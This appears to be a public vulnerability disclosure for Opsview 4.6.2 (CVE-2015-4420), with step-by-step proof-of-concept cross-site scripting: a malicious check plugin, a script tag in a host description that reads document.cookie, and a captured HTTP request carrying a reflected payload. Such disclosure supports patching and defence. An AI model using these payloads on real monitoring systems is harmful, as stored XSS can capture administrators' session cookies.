@@ -1,0 +1,68 @@
+# Exploit title: Opsview 4.6.2 - Multiple XSS
+# Date: 07-06-2015
+# Vendor homepage: www.opsview.com
+# Version: 4.6.2
+# CVE: CVE-2015-4420
+# Author: Dolev Farhi @dolevf
+# Tested On: Kali Linux + Windows 7
+
+# Details:
+# --------
+# Opsview is a monitoring system based on Nagios Core. Opsview is prone to several stored and reflected XSS vulnerabilities in the latest version
+
+
+
+1. Stored XSS through a malicious check plugin
+
+a. Create a plugin with the following content:
+
+#!/bin/bash
+echo '<script>alert("script0t0s")</script>'
+exit 2
+
+b. create a new check and assign this plugin.
+
+c. once a host uses this check, navigate to the event page, the XSS will be injected.
+
+d. once a user/admin acknowledges this critical event (exit 2), the code will be injected prior his acknowledgement.
+
+
+
+2. Stored XSS in host profile
+
+a. add a host
+
+b. in the description of the host, add a description as the one below:
+<script>alert(document.cookie)</script>
+
+c. save settings
+
+d. once a user/admin views the host settings, XSS will be injected.
+
+
+3. Reflected XSS in Test service check page.
+a. Add a new service check
+
+b. Test the new service check against any host and provide in the command line the following <script>alert("test")</script>
+
+c. the XSS will immediately reflect to the screen.
+
+response output:
+
+POST /state/service/166/exec HTTP/1.1
+Host: 192.168.0.20
+User-Agent: Mozilla/5.0 (X11; Linux i686; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.4.0
+Accept: text/plain, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Referer: http://192.168.0.20/status/service?host_state=0&host_filter=handled&host=opsview
+Content-Length: 105
+Cookie: PHPSESSID=
+auth_tkt=
+Connection: keep-alive
+Pragma: no-cache
+Cache-Control: no-cache
+
+plugin_args=%3Cscript%3Ealert(%22opsview%22)%3C%2Fscript%3E&_CSRFToken=0x84BCDAD00D5111E5988CB34E7AFD915
